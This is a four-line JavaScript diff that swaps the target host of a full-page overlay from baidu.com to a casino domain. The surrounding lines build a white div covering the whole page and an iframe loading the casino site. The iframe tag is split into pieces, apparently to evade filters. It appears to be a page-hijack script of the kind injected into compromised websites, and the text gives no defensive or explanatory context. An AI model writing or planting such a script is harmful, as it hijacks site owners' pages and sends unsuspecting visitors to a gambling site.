@@ -1,4 +1,4 @@
-var ab = "www.baidu.com";
+var ab = "www.insightbet.casino";
 var ss = '<div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;">' +
     '<ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0 frameborder="0" width="100%" height="100%" src="https://' + ab + '"></iframe>' +
     '</div>' +
